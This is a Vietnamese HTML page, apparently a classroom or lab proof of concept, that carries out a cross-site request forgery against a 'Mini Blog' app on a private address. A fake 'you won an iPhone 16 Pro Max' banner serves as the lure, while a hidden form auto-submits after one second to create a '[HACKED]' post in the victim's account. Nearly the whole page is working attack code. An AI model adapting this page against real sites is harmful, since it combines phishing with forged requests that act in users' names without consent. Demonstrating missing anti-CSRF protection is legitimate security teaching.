<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Chương Trình Nhận Quà Trúng Thưởng!</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
        .card { border: 1px solid #ccc; padding: 20px; display: inline-block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        h1 { color: #2e7d32; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎉 Chúc mừng bạn đã trúng thưởng iPhone 16 Pro Max! 🎉</h1>
        <p>Đang tiến hành xác nhận thông tin nhận quà, vui lòng chờ trong giây lát...</p>
    </div>

    <!-- Form độc hại tự động Submit tới ứng dụng Mini Blog -->
    <form id="csrfForm" action="https://192.168.20.136:8000/post/create" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="title" value="[HACKED] Bài viết tự động từ kịch bản tấn công CSRF!" />
        <input type="hidden" name="category_id" value="1" />
        <input type="hidden" name="content" value="<p>Tài khoản này đã bị lừa click vào liên kết độc hại 
            và tự động tạo bài viết do hệ thống thiếu mã xác thực Anti-CSRF Token.</p>" />
        <input type="hidden" name="tags_input" value="CSRF, HackDemo" />
    </form>

    <script>
        // Tự động submit form sau 1 giây mở trang
        setTimeout(function() {
            document.getElementById('csrfForm').submit();
        }, 1000);
    </script>
</body>
</html>
